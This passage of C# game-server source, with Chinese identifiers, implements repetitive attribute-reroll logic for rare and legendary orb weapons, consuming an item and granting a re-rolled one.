					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠武器传说属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠武器传说属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
